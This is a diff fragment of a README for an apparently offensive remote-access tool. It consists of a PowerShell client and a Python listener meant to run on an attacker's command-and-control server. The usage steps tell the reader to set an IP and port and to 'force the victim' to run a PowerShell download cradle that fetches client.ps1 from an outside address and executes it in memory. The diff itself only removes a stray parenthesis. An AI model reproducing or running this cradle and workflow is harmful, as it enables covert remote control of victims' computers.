@@ -8,4 +8,4 @@ client.ps1 is powershell script which is loading pure C# callback code. The idea
 # How to use:
 1. Open client.ps1 with any text editor and modify your IP / Port
 2. Host both listener.py and client.ps1 to the attacker's box or C2 infrastructure server
-3. Force the victim to remotely run and execute the powershell script in memory (for example: powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.126.128/client.ps1')")
+3. Force the victim to remotely run and execute the powershell script in memory (for example: powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.126.128/client.ps1')"
